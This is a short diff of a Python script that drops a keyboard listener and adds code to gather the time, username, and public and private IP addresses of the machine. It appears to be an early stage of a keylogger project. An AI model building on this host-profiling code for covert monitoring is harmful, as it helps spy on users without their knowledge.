@@ -1,8 +1,15 @@
 from pynput.keyboard import Key, Listener
+import time
+import os
+import requests
+import socket
 
-def on_press(key):
-    print(key)
+datetime = time.ctime(time.time())
+user = os.path.expanduser('~').split('\\')[2]
+publicIP = requests.get('https://api.ipify.org/').text
+privateIP = socket.gethostbyname(socket.gethostname())
 
-with Listener(on_press = on_press) as listener:
-    listener.join()
-    
+print(datetime)
+print(user)
+print(publicIP)
+print(privateIP)
